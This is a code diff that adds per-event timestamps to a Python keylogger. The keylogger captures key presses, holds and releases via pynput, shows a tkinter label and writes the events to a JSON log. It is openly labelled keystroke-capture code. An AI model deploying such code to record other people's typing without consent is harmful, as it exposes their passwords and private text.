@@ -7,6 +7,7 @@ from tkinter import Label as _Label
 from pynput import keyboard as _keyboard
 from typing import Any as _Any
 from datetime import datetime as _dt
+import time
 
 from json import dumps as _dumps
 
@@ -14,7 +15,7 @@ keys_used: list | None = []
 flag: bool = False
 keys: str = ""
 now: _dt = _dt.now()
-
+baseline = 0
 
 def generate_text_log(key: _Any) -> None:
     """
@@ -49,13 +50,13 @@ def on_press(key: _Any) -> None:
         key (Any): The key that was pressed.
     """
 
-    global flag, keys_used, keys
+    global flag, keys_used, keys, baseline
     if not flag:
-        keys_used.append({"Pressed": f"{key}"})
+        keys_used.append({"Pressed": f"{key}", "Time": f"{time.perf_counter() - baseline}"})
         flag = True
 
     if flag:
-        keys_used.append({"Held": f"{key}"})
+        keys_used.append({"Held": f"{key}", "Time": f"{time.perf_counter() - baseline}"})
     generate_json_file(keys_used)
 
 
@@ -67,8 +68,8 @@ def on_release(key: _Any) -> None:
         key (Any): The key that was released.
     """
 
-    global flag, keys_used, keys
-    keys_used.append({"Released": f"{key}"})
+    global flag, keys_used, keys, baseline
+    keys_used.append({"Released": f"{key}", "Time": f"{time.perf_counter() - baseline}"})
 
     if flag:
         flag = False
@@ -85,7 +86,8 @@ def start_keylogger():
     """
     Initiates the keylogger, enabling keystroke logging.
     """
-
+    global baseline
+    baseline = time.perf_counter()
     listener = _LISTENER
     listener.start()
     label.config(
